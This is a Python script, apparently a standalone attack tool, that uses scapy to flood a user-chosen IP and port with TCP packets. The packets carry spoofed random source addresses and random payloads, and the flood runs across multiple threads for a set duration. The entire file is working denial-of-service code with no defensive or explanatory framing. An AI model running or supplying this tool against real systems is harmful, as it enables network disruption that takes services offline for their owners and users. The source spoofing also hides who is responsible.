import random, sys, os, time, threading
from scapy.all import *

def stopOutput():
  sys.stdout = open(os.devnull, 'w')

def enableOutput():
  sys.stdout = sys.__stdout__

#Get the IP address to attack and duration of attack from the user
target = raw_input("Enter the target IP address for the attack: ")
targetPort = int(raw_input("Enter the target port number: "))
sourcePort = int(raw_input("Enter the source port number: "))
packetSize = int(raw_input("Enter the size of each packet: "))
threads = int(raw_input("Enter the number of threads: "))
duration = int(raw_input("Enter the duration of the attack (in seconds):"))

#This sets the time to stop attacking
stopTime = time.time() + duration
print("Attacking IP %s:%i for %s seconds" % (target, targetPort, duration))

def sendPackets():
    #Setting the time, the packet counter, and suppressing output because scapy prints a TON
    timer = time.time()
    i = 0
    stopOutput()

    while (timer < stopTime):
        # We're making a fake IP address to set as the source here
        ip1 = str(random.randint(1, 254))
        ip2 = str(random.randint(1, 254))
        ip3 = str(random.randint(1, 254))
        ip4 = str(random.randint(1, 254))
        sourceAddr = str("%s.%s.%s.%s" % (ip1, ip2, ip3, ip4))

        ip = IP(src = sourceAddr, dst = target)
        tcp = TCP(sport = sourcePort, dport = targetPort)
        packet = ip / tcp / Raw(RandString(size=packetSize))
        send(packet,inter = .001)
        #Setting the time again before we re-loop  
        timer = time.time()  
        i += 1

    enableOutput()
    print("\nAttack completed on thread. Sent %i packets." % i)

# Time to start the threads!
thread = 1
threadList = list()
while (thread <= threads):
    print("Starting thread %i" % thread)
    thread += 1
    x = threading.Thread(target=sendPackets)
    threadList.append(x)
    x.start()

for t in threadList:
    t.join()

print("\nAttack Completed on all threads for %s:%s." % (target, targetPort))